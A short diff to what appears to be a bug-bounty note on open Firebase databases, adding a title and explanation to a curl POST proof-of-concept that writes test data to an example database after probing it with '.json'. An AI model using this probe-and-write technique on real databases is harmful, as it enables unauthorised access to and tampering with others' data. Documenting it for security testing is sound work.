@@ -7,11 +7,13 @@ Add '.json' at the end of firebase database url if you see `null` or data in rep
 For example: https://insecure-firebase.firebaseio.com/.json returns `null`
 
 
-#### POC 
+#### POC (Insert data)
 ```
 curl -X POST https://insecure-firebase.firebaseio.com/testing.json \
 -d '{"cat": "meow", "dog": "bowbow"}'
 ```
+This will create a new data location `/testing` in the database
+
 Now visit https://insecure-firebase.firebaseio.com/testing.json or https://insecure-firebase.firebaseio.com/.json
 
 and you will see new data is added to database
